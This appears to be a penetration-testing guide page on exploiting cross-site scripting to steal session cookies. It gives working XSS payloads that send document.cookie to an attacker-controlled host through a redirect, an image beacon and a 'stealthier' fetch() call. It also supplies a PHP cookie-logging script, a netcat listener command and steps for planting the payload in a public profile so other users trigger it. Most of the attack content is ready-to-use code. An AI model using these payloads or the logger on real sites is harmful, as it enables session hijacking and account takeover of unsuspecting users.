# Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** vulnerabilities are among the most common web application vulnerabilities and can lead to severe security issues, including session hijacking. This guide focuses on exploiting XSS vulnerabilities to obtain valid session identifiers, such as session cookies, in a generic manner that can be applied to various web applications.

#### 🔑 Requirements for XSS Attacks

For an XSS attack to successfully leak session cookies, the following conditions must be met:

1. **Session cookies must be included in all HTTP requests.**
2. **Session cookies must be accessible via JavaScript** (i.e., the `HTTPOnly` attribute should be absent).

#### 🎯 Crafting XSS Payloads

To exploit an XSS vulnerability, you can use payloads that trigger automatically through event handlers. Here are some examples of payloads that can be used in input fields:

*   **Basic Payloads**:

    ```javascript
    javascriptCopy Code"><img src=x onerror=alert(document.domain)>
    "><img src=x onerror=confirm(1)>
    "><img src=x onerror=prompt(1)>
    ```
*   **Advanced Payload Using CSS Animation**:

    {% code overflow="wrap" %}
    ```javascript
    <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<YOUR_IP>:8000/log.php?c=' + document.cookie;"></video>
    ```
    {% endcode %}

{% hint style="info" %}
In the real world, we can use something like [XSSHunter (now deprecated)](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
{% endhint %}

These payloads utilize the `onerror` event of an image tag to execute JavaScript when the image fails to load.

#### 📜 Obtaining Session Cookies via XSS

To capture a victim's session cookie, you can create a cookie-logging script. Here’s a generic example of a PHP script that logs cookies:

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.example.com/");
exit;
?>
```

This script waits for a request containing the session cookie and logs it to a file. You can host this script on any server you control.

#### 🧪 Simulating the Attack

1. **Update the Profile**: In a web application where you can edit user profile fields, insert your crafted payload into a field that is displayed publicly.
2. **Trigger the Payload**: The payload will execute when the profile is viewed by another user. This could be a public profile or a shared link.
3. **Capture the Cookie**: When the victim views the profile, the payload will send the session cookie to your logging script. You can check the log file to see if the cookie has been captured.

#### 🔄 Using Netcat for Cookie Capture

Instead of a logging script, you can use **Netcat** to capture cookies:

1.  **Craft a Payload**: Use a payload that sends the cookie to your listening Netcat instance:

    {% code overflow="wrap" %}
    ```javascript
    <h1 onmouseover='document.write(`<img src="http://<YOUR_IP>:8000?cookie=${btoa(document.cookie)}">`)'>Hover over me</h1>
    ```
    {% endcode %}
2.  **Start Netcat**: Listen for incoming connections:

    ```bash
    nc -nlvp 8000
    ```
3. **Simulate the Victim's Action**: When the victim hovers over the element containing your payload, it will trigger a request to your Netcat listener, sending the session cookie.

#### 🔍 Stealthier Payloads

For a more discreet approach, you can use the `fetch()` method to send cookies without redirecting the victim:

```javascript
<script>fetch(`http://<YOUR_IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
